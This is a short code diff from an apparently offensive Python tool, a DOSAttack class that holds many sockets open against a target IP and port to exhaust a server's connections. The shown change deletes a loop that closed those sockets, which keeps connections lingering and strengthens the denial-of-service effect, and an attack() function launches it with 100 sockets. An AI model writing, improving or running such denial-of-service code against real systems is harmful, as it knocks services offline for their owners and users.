@@ -35,9 +35,6 @@ class DOSAttack():
                     soldier.close()
                     self._soldiers.append(self.create_soldier_socket())
                 time.sleep(sleep/len(self._soldiers))
-        for soldier in self._soldiers:
-            soldier.close()
-            self._soldiers.remove(soldier)
 
 def attack(target_ip,target_port):
     dos = DOSAttack(target_ip,target_port,100)
